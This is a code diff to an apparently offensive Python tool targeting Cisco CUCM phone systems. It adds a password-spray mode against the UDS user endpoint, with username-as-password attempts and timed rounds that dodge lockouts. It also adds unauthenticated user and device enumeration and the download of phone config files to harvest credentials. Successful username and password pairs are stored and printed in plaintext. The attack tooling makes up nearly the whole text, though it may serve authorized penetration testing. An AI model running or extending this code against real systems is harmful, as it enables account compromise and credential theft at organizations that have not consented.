@@ -15,7 +15,9 @@ import time
 import threading
 import queue
 import random
+import secrets
 from datetime import datetime
+from urllib.parse import quote
 from contextlib import redirect_stdout, redirect_stderr
 from alive_progress import alive_bar
 import tftpy
@@ -638,6 +640,373 @@ def log_uds_usernames_to_db(cucm_host, usernames, db_file='thief.db'):
             print(f'[!] log_uds_usernames_to_db error: {e}')
         return False
 
+
+def record_uds_users(cucm_host, usernames, db_file='thief.db'):
+    """
+    Upsert the live UDS user enumeration into the uds_users table.
+
+    On conflict (same cucm_host + username), updates last_seen but preserves
+    first_seen. Returns the number of new rows inserted.
+    """
+    try:
+        conn = sqlite3.connect(db_file, timeout=30.0)
+        cursor = conn.cursor()
+        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
+        inserted = 0
+        for username in usernames:
+            cursor.execute('''
+                INSERT INTO uds_users (cucm_host, username, first_seen, last_seen)
+                VALUES (?, ?, ?, ?)
+                ON CONFLICT(cucm_host, username)
+                  DO UPDATE SET last_seen = excluded.last_seen
+            ''', (cucm_host, username, timestamp, timestamp))
+            inserted += cursor.rowcount
+        conn.commit()
+        conn.close()
+        return inserted
+    except Exception as e:
+        if globals().get('debug', False):
+            print(f'[!] record_uds_users error: {e}')
+        return 0
+
+
+def log_spray_attempt(cucm_host, username, password, status_code, error, db_file='thief.db'):
+    """
+    Append a row to spray_attempts. Retries with exponential backoff on
+    SQLite 'database is locked' since worker threads write concurrently.
+    """
+    max_retries = 5
+    retry_delay = 0.1
+    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
+
+    for attempt in range(max_retries):
+        try:
+            conn = sqlite3.connect(db_file, timeout=30.0)
+            cursor = conn.cursor()
+            cursor.execute('''
+                INSERT INTO spray_attempts
+                    (cucm_host, username, password, status_code, error, attempt_time)
+                VALUES (?, ?, ?, ?, ?, ?)
+            ''', (cucm_host, username, password, status_code, error, timestamp))
+            conn.commit()
+            conn.close()
+            return
+        except sqlite3.OperationalError as e:
+            if 'locked' in str(e).lower() and attempt < max_retries - 1:
+                time.sleep(retry_delay * (2 ** attempt))
+                continue
+            if globals().get('debug', False):
+                print(f'[!] log_spray_attempt sqlite error: {e}')
+            return
+        except Exception as e:
+            if globals().get('debug', False):
+                print(f'[!] log_spray_attempt error: {e}')
+            return
+
+
+def parse_uds_devices(xml_body):
+    """Extract SEP device names from a /cucm-uds/user/{id} XML response body."""
+    return re.findall(r'<device>(SEP[0-9A-Fa-f]{12})</device>', xml_body)
+
+
+def log_uds_device(cucm_host, username, device_name, source, db_file='thief.db'):
+    """Insert a (cucm_host, username, device_name) row into uds_devices; ignores duplicates."""
+    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
+    try:
+        conn = sqlite3.connect(db_file, timeout=30.0)
+        conn.execute(
+            'INSERT OR IGNORE INTO uds_devices '
+            '(cucm_host, username, device_name, source, discovery_time) '
+            'VALUES (?, ?, ?, ?, ?)',
+            (cucm_host, username, device_name, source, timestamp),
+        )
+        conn.commit()
+        conn.close()
+    except Exception as e:
+        if globals().get('debug', False):
+            print(f'[!] log_uds_device error: {e}')
+
+
+def get_user_devices_unauthenticated(cucm_host, port=UDS_PORT, username='', timeout=10):
+    """
+    Probe /cucm-uds/user/{username} with no credentials.
+    Returns a list of SEP device names if the server responds 200, else [].
+    """
+    url = f'https://{cucm_host}:{port}/cucm-uds/user/{quote(username, safe="")}'
+    try:
+        resp = requests.get(url, verify=False, timeout=timeout)
+        if resp.status_code == 200:
+            return parse_uds_devices(resp.text)
+    except Exception:
+        pass
+    return []
+
+
+def enumerate_devices_unauthenticated(cucm_host, port, usernames, db_file, threads=10, _probe_fn=None):
+    """
+    Fan out unauthenticated device probes across all usernames in parallel.
+    Logs found SEP names to uds_devices with source='userenum'.
+    Returns the count of users for whom at least one device was found.
+    _probe_fn is injectable for testing.
+    """
+    if _probe_fn is None:
+        _probe_fn = get_user_devices_unauthenticated
+
+    found_count = 0
+    lock = threading.Lock()
+    work = queue.Queue()
+    for u in usernames:
+        work.put(u)
+
+    def worker():
+        nonlocal found_count
+        while True:
+            try:
+                username = work.get_nowait()
+            except queue.Empty:
+                return
+            devices = _probe_fn(cucm_host, port, username)
+            if devices:
+                with lock:
+                    found_count += 1
+                for device_name in devices:
+                    log_uds_device(cucm_host, username, device_name, 'userenum', db_file)
+
+    thread_list = [threading.Thread(target=worker, daemon=True) for _ in range(max(1, min(threads, len(usernames))))]
+    for t in thread_list:
+        t.start()
+    for t in thread_list:
+        t.join()
+    return found_count
+
+
+def download_uds_discovered_configs(cucm_host, device_names, db_file, use_tftp=True):
+    """
+    Download and parse SEP config files for devices discovered via UDS.
+    Logs any credentials found to the DB.
+    Returns the count of configs that yielded at least one credential.
+    """
+    hits = 0
+    for device_name in device_names:
+        filename = f'{device_name}.cnf.xml'
+        creds, users = search_for_secrets(cucm_host, filename, use_tftp=use_tftp)
+        if creds or users:
+            log_credentials_to_db(cucm_host, creds, users, db_file)
+        if creds:
+            hits += 1
+    return hits
+
+
+def is_user_rate_limited(username, db_file='thief.db', hours=1):
+    """
+    Return True iff `username` has any spray_attempts row within the last `hours`.
+    Per-username globally — the cucm_host column is not part of the check.
+    """
+    try:
+        modifier = f'-{int(hours)} hours'
+        conn = sqlite3.connect(db_file, timeout=30.0)
+        cursor = conn.cursor()
+        cursor.execute('''
+            SELECT 1 FROM spray_attempts
+             WHERE username = ?
+               AND attempt_time > datetime('now', 'localtime', ?)
+             LIMIT 1
+        ''', (username, modifier))
+        row = cursor.fetchone()
+        conn.close()
+        return row is not None
+    except Exception as e:
+        if globals().get('debug', False):
+            print(f'[!] is_user_rate_limited error: {e}')
+        # Fail closed: if we can't check, assume limited (don't spray).
+        return True
+
+
+def _spray_oracle_check(cucm_host, port, user_sample, timeout=10):
+    """
+    Probe /cucm-uds/user/<user_sample> with HTTP Basic Auth using a deliberately
+    bogus password. Used to verify the target actually validates creds before
+    burning a real password across the user list.
+
+    Returns:
+        'ok'      — got 401, endpoint validates creds normally.
+        'bypass'  — got 200, endpoint returned user data for a bogus password.
+                    DO NOT proceed; spraying real creds would be a free oracle bypass.
+        'unknown' — anything else (403/404/5xx/network error). Operator must
+                    decide whether to continue with --no-spray-probe.
+    """
+    bogus = f'spray-probe-{secrets.token_hex(4)}'
+    url = f'https://{cucm_host}:{port}/cucm-uds/user/{quote(user_sample, safe="")}'
+    dbg(f'UDS oracle probe GET {url} (timeout={timeout}s)')
+    try:
+        resp = requests.get(url, auth=(user_sample, bogus), verify=False, timeout=timeout)
+    except Exception as e:
+        dbg(f'UDS oracle probe raised {type(e).__name__}: {e}')
+        return 'unknown'
+    dbg(f'UDS oracle probe -> {resp.status_code} ({len(resp.content)} bytes)')
+    if resp.status_code == 401:
+        return 'ok'
+    if resp.status_code == 200:
+        return 'bypass'
+    return 'unknown'
+
+
+def _load_password_list(path):
+    """
+    Read one password per line, stripping whitespace and skipping blanks.
+    Preserves order and duplicates.
+    """
+    with open(path, 'r', encoding='utf-8', errors='replace') as f:
+        return [line.strip() for line in f if line.strip()]
+
+
+def _spray_worker(work_queue, results, password, cucm_host, port, db_file, dead_flag, timeout=10, user_as_pass=False):
+    """
+    Thread target. Pops usernames off work_queue and attempts Basic Auth GET
+    against /cucm-uds/user/{username}. Logs every attempt to spray_attempts.
+
+    results: dict with int keys 'hits'/'misses'/'errors'/'other' and 'lock'.
+    dead_flag: threading.Event — externally-settable abort signal that short-circuits the worker loop between iterations (used by tests; future versions may set this from the orchestrator for mid-round aborts).
+    """
+    while not dead_flag.is_set():
+        try:
+            username = work_queue.get_nowait()
+        except queue.Empty:
+            return
+
+        effective_password = username if user_as_pass else password
+        url = f'https://{cucm_host}:{port}/cucm-uds/user/{quote(username, safe="")}'
+        status_code = None
+        error = None
+        resp = None
+        try:
+            resp = requests.get(url, auth=(username, effective_password), verify=False, timeout=timeout)
+            status_code = resp.status_code
+        except requests.exceptions.Timeout as e:
+            error = f'timeout: {e}'
+        except requests.exceptions.ConnectionError as e:
+            error = f'connection: {e}'
+        except Exception as e:
+            error = f'{type(e).__name__}: {e}'
+
+        log_spray_attempt(cucm_host, username, effective_password, status_code, error, db_file)
+
+        if status_code == 200 and resp is not None:
+            for device_name in parse_uds_devices(resp.text):
+                log_uds_device(cucm_host, username, device_name, 'spray_hit', db_file)
+
+        with results['lock']:
+            if status_code == 200:
+                results['hits'] += 1
+            elif status_code == 401:
+                results['misses'] += 1
+            elif status_code is None:
+                results['errors'] += 1
+            else:
+                results['other'] += 1
+
+
+def run_spray(cucm_host, port, passwords, threads, rate_limit_hours, probe, db_file, user_as_pass=False):
+    """
+    Top-level orchestrator for the UDS Basic-Auth password spray.
+
+    Sequence:
+      1. Pre-flight oracle probe (unless probe=False).
+      2. Enumerate users from /cucm-uds/users, persist to uds_users.
+      3. For each password: build rate-limit-filtered queue, run worker pool,
+         compute kill switch, sleep ~1h before the next password.
+    """
+    if _TEST_MODE:
+        return
+
+    # 1. Probe
+    if probe:
+        # Need at least one user to probe; do a tiny pre-enum if necessary.
+        sample_users = get_users_api(cucm_host, port=port)
+        if not sample_users:
+            print('[-] No users returned from UDS; cannot probe or spray.')
+            return
+        oracle_result = _spray_oracle_check(cucm_host, port, sample_users[0])
+        if oracle_result == 'bypass':
+            print('[!] ORACLE BYPASS: /cucm-uds/user/{userid} returned 200 for a bogus password.')
+            print('[!] The endpoint is not validating credentials. Aborting before any real password is sent.')
+            return
+        if oracle_result == 'unknown':
+            print('[-] Oracle probe returned an unexpected status. Aborting.')
+            print('[-] Re-run with --no-spray-probe if you have already verified the target out-of-band.')
+            return
+        print('[+] Oracle probe OK (401 returned for bogus credentials).')
+        users = sample_users
+    else:
+        users = get_users_api(cucm_host, port=port)
+
+    if not users:
+        print('[-] No users returned from UDS. Nothing to spray.')
+        return
+
+    # 2. Persist enumeration
+    record_uds_users(cucm_host, users, db_file)
+    print(f'[+] Loaded {len(users)} users from UDS API.')
+
+    # 3. Per-password rounds (user_as_pass runs as a single implicit round)
+    rounds = [(1, None)] if user_as_pass else list(enumerate(passwords, start=1))
+    total_rounds = len(rounds)
+    for round_index, password in rounds:
+        # 3a. Build filtered work queue on the main thread (TOCTOU-safe).
+        work = queue.Queue()
+        skipped = 0
+        for username in users:
+            if is_user_rate_limited(username, db_file, hours=rate_limit_hours):
+                skipped += 1
+            else:
+                work.put(username)
+        eligible = work.qsize()
+        label = 'username-as-password' if user_as_pass else password
+        print(f'[round {round_index}/{total_rounds}] eligible={eligible} skipped={skipped} '
+              f'(rate-limited within last {rate_limit_hours}h)')
+
+        if eligible == 0:
+            print(f'[round {round_index}/{total_rounds}] no eligible users; skipping.')
+        else:
+            # 3b. Worker pool
+            results = {'hits': 0, 'misses': 0, 'errors': 0, 'other': 0, 'lock': threading.Lock()}
+            dead_flag = threading.Event()
+            worker_threads = []
+            for _ in range(max(1, min(threads, eligible))):
+                t = threading.Thread(
+                    target=_spray_worker,
+                    args=(work, results, password, cucm_host, port, db_file, dead_flag),
+                    kwargs={'user_as_pass': user_as_pass},
+                    daemon=True,
+                )
+                t.start()
+                worker_threads.append(t)
+            for t in worker_threads:
+                t.join()
+
+            total_attempted = results['hits'] + results['misses'] + results['errors'] + results['other']
+            print(f'[round {round_index}/{total_rounds}] hits={results["hits"]} '
+                  f'misses={results["misses"]} errors={results["errors"]} '
+                  f'other={results["other"]} (skipped {skipped})')
+
+            # 3c. Kill switch — fires AFTER all workers join. If >50% of the
+            # round's attempts returned non-401-non-200 status AND we attempted
+            # at least 4 (min sample guard), abort the run before the next
+            # password round. The current round's in-flight attempts complete
+            # before the abort decision; mid-round abort is not implemented in v1.
+            bad = results['errors'] + results['other']
+            if total_attempted >= 4 and bad / total_attempted > 0.5:
+                print(f'[!] KILL SWITCH: {bad}/{total_attempted} attempts returned errors or '
+                      f'non-401-non-200 status. Aborting run.')
+                return
+
+        # 3d. Inter-round sleep (skip after the last password).
+        if round_index < total_rounds:
+            sleep_secs = 3600 + random.uniform(-60, 60)
+            print(f'[round {round_index}/{total_rounds}] sleeping {sleep_secs:.0f}s until next round...')
+            time.sleep(sleep_secs)
+
+
 def search_for_secrets(CUCM_host, filename, use_tftp=True):
     if debug:
         print(f'[DEBUG] Processing config file: {filename}')
@@ -840,8 +1209,59 @@ def init_database(db_file='thief.db'):
         )
     ''')
 
+    # Create table for users enumerated via UDS /cucm-uds/users (spray feature)
+    cursor.execute('''
+        CREATE TABLE IF NOT EXISTS uds_users (
+            id INTEGER PRIMARY KEY AUTOINCREMENT,
+            cucm_host TEXT NOT NULL,
+            username TEXT NOT NULL,
+            first_seen TEXT NOT NULL,
+            last_seen TEXT NOT NULL,
+            UNIQUE(cucm_host, username)
+        )
+    ''')
+
+    # Create table for every spray attempt against the UDS user endpoint
+    cursor.execute('''
+        CREATE TABLE IF NOT EXISTS spray_attempts (
+            id INTEGER PRIMARY KEY AUTOINCREMENT,
+            cucm_host TEXT NOT NULL,
+            username TEXT NOT NULL,
+            password TEXT NOT NULL,
+            status_code INTEGER,
+            error TEXT,
+            attempt_time TEXT NOT NULL
+        )
+    ''')
+    cursor.execute('''
+        CREATE INDEX IF NOT EXISTS idx_spray_attempts_user_time
+            ON spray_attempts(username, attempt_time)
+    ''')
+
+    # Create table for devices discovered via UDS (unauthenticated probe or spray hit)
+    cursor.execute('''
+        CREATE TABLE IF NOT EXISTS uds_devices (
+            id INTEGER PRIMARY KEY AUTOINCREMENT,
+            cucm_host TEXT NOT NULL,
+            username TEXT NOT NULL,
+            device_name TEXT NOT NULL,
+            source TEXT NOT NULL,
+            discovery_time TEXT NOT NULL,
+            UNIQUE(cucm_host, username, device_name)
+        )
+    ''')
+
     conn.commit()
     conn.close()
+    # Tighten DB file permissions — config XML and spray attempts contain
+    # plaintext secrets; default umask can leave them world-readable.
+    try:
+        os.chmod(db_file, 0o600)
+    except OSError:
+        # Best-effort: on filesystems without POSIX perms (FAT, some network
+        # mounts) chmod will fail. The operator still has the DB; we just
+        # couldn't restrict access. Not fatal.
+        pass
     return db_file
 
 def check_already_attempted(cucm_host, filename, db_file='thief.db'):
@@ -1180,19 +1600,66 @@ def display_database_summary(db_file='thief.db', cucm_filter=None):
             else:
                 raise
 
+        # Get UDS spray hits (status_code == 200)
+        spray_hits = []
+        try:
+            if cucm_filter:
+                cursor.execute('''
+                    SELECT cucm_host, username, password, attempt_time
+                      FROM spray_attempts
+                     WHERE status_code = 200 AND cucm_host = ?
+                     ORDER BY attempt_time DESC
+                ''', (cucm_filter,))
+            else:
+                cursor.execute('''
+                    SELECT cucm_host, username, password, attempt_time
+                      FROM spray_attempts
+                     WHERE status_code = 200
+                     ORDER BY attempt_time DESC
+                ''')
+            spray_hits = cursor.fetchall()
+        except sqlite3.OperationalError as e:
+            if 'no such table' in str(e):
+                spray_hits = []
+            else:
+                raise
+
+        # Get UDS devices (unauthenticated enum or spray hit)
+        uds_devices = []
+        try:
+            if cucm_filter:
+                cursor.execute('''
+                    SELECT cucm_host, username, device_name, source, discovery_time
+                      FROM uds_devices
+                     WHERE cucm_host = ?
+                     ORDER BY username, device_name
+                ''', (cucm_filter,))
+            else:
+                cursor.execute('''
+                    SELECT cucm_host, username, device_name, source, discovery_time
+                      FROM uds_devices
+                     ORDER BY username, device_name
+                ''')
+            uds_devices = cursor.fetchall()
+        except sqlite3.OperationalError as e:
+            if 'no such table' in str(e):
+                uds_devices = []
+            else:
+                raise
+
         # Get download stats (handle missing table gracefully)
         total_attempts = 0
         successful_downloads = 0
         try:
             if cucm_filter:
                 cursor.execute('''
-                    SELECT COUNT(*), SUM(success) 
-                    FROM download_attempts 
+                    SELECT COUNT(*), SUM(success)
+                    FROM download_attempts
                     WHERE cucm_host = ?
                 ''', (cucm_filter,))
             else:
                 cursor.execute('''
-                    SELECT COUNT(*), SUM(success) 
+                    SELECT COUNT(*), SUM(success)
                     FROM download_attempts
                 ''')
             stats = cursor.fetchone()
@@ -1204,10 +1671,10 @@ def display_database_summary(db_file='thief.db', cucm_filter=None):
                 successful_downloads = 0
             else:
                 raise
-        
+
         conn.close()
         
-        if not credentials and not usernames and not mac_prefixes and not phone_cucm and not cluster_servers:
+        if not credentials and not usernames and not mac_prefixes and not phone_cucm and not cluster_servers and not spray_hits and not uds_devices:
             print(f'\n[-] No data found in database')
             if cucm_filter:
                 print(f'[-] Filter: CUCM host = {cucm_filter}')
@@ -1309,6 +1776,19 @@ def display_database_summary(db_file='thief.db', cucm_filter=None):
             print("-"*70)
             for queried, hostname, ipv4, ipv6, srv_type, timestamp in cluster_servers:
                 print(f'{queried:<24} {(hostname or ""):<30} {(ipv4 or ""):<16}')
+
+        if spray_hits:
+            print('\n=== UDS Spray Hits ===')
+            for host, user, pw, ts in spray_hits:
+                print(f'  [{ts}] {host}  {user} : {pw}')
+
+        if uds_devices:
+            print(f'\n\033[1m[+] UDS Devices ({len(uds_devices)} total)\033[0m')
+            print("-"*70)
+            print(f'{"Username":<24} {"Device":<20} {"Source":<12} {"CUCM Host"}')
+            print("-"*70)
+            for cucm_host_row, username, device_name, source, ts in uds_devices:
+                print(f'{username:<24} {device_name:<20} {source:<12} {cucm_host_row}')
 
         print(f'\n{"="*70}')
         print(f'\n\033[1mDATABASE STATISTICS:\033[0m')
@@ -1552,7 +2032,22 @@ def main():
     parser.add_argument('--servers', action='store_true', default=False, help='Enumerate the CUCM cluster topology via UDS /cucm-uds/servers (requires -H)')
     parser.add_argument('--http', action='store_true', default=False, help='Use HTTP (port 6970) as the primary download protocol, with TFTP fallback (default: TFTP first, HTTP fallback)')
     parser.add_argument('--uds-port', type=int, default=UDS_PORT, help=f'CUCM UDS API HTTPS port for --userenum (default: {UDS_PORT})')
-    
+    # Password spray (UDS Basic Auth against /cucm-uds/user/{userid})
+    parser.add_argument('--spray', action='store_true', default=False,
+                        help='Password-spray the UDS API (requires -H; mutually exclusive with --brute-mac)')
+    parser.add_argument('--spray-password', type=str, default=None,
+                        help='Single password to spray across all eligible users')
+    parser.add_argument('-P', '--passwords', type=str, default=None, metavar='FILE',
+                        help='Password list file; one password per line; rounds separated by ~1h sleep')
+    parser.add_argument('--spray-user-as-pass', action='store_true', default=False,
+                        help='Spray each user with their own username as the password')
+    parser.add_argument('--spray-threads', type=int, default=10,
+                        help='Concurrent spray workers (default: 10)')
+    parser.add_argument('--spray-rate-limit-hours', type=int, default=1,
+                        help='Per-username rate-limit window in hours (default: 1)')
+    parser.add_argument('--no-spray-probe', action='store_true', default=False,
+                        help='Skip the pre-flight oracle probe (use only after manual verification)')
+
     # Output Options
     parser.add_argument('--csv', type=str, metavar='FILENAME', help='Export discovered credentials to CSV file')
     parser.add_argument('--outfile', type=str, default='cucm_users.txt', help='Specify output file for enumerated usernames (default: cucm_users.txt)')
@@ -1761,8 +2256,70 @@ def main():
             if debug:
                 for username in unique_users:
                     print(f'{username}')
+            if not no_db:
+                print(f'[*] Probing UDS for associated devices (unauthenticated)...')
+                found = enumerate_devices_unauthenticated(
+                    CUCM_host, args.uds_port, unique_users, db_file, threads=threads,
+                )
+                if found:
+                    print(f'[+] Found devices for {found} user(s) — attempting config downloads...')
+                    conn = sqlite3.connect(db_file)
+                    device_names = [r[0] for r in conn.execute(
+                        'SELECT DISTINCT device_name FROM uds_devices WHERE cucm_host = ?',
+                        (CUCM_host,),
+                    ).fetchall()]
+                    conn.close()
+                    hits = download_uds_discovered_configs(
+                        CUCM_host, device_names, db_file, use_tftp=use_tftp,
+                    )
+                    print(f'[+] Config download complete: {hits}/{len(device_names)} configs yielded credentials')
+                else:
+                    print(f'[-] No device associations returned unauthenticated')
         else:
             print('[-] No users returned from UDS API. Re-run with -d for request/response details.')
+        quit(0)
+
+    if args.spray:
+        if not CUCM_host:
+            print('--spray requires -H/--host to specify the CUCM server')
+            quit(1)
+        if args.brute_mac:
+            print('--spray and --brute-mac are mutually exclusive')
+            quit(1)
+        options_set = sum([
+            args.spray_password is not None,
+            args.passwords is not None,
+            args.spray_user_as_pass,
+        ])
+        if options_set != 1:
+            print('--spray requires exactly one of --spray-password, -P/--passwords, or --spray-user-as-pass')
+            quit(1)
+        passwords = []
+        if args.passwords:
+            try:
+                passwords = _load_password_list(args.passwords)
+            except FileNotFoundError:
+                print(f'[-] Password file not found: {args.passwords}')
+                quit(1)
+            except OSError as e:
+                print(f'[-] Could not read password file {args.passwords}: {e}')
+                quit(1)
+            if not passwords:
+                print(f'[-] Password file is empty: {args.passwords}')
+                quit(1)
+        elif args.spray_password is not None:
+            passwords = [args.spray_password]
+
+        run_spray(
+            cucm_host=CUCM_host,
+            port=args.uds_port,
+            passwords=passwords,
+            threads=args.spray_threads,
+            rate_limit_hours=args.spray_rate_limit_hours,
+            probe=not args.no_spray_probe,
+            db_file=db_file,
+            user_as_pass=args.spray_user_as_pass,
+        )
         quit(0)
 
     # Handle MAC brute forcing from detected phones
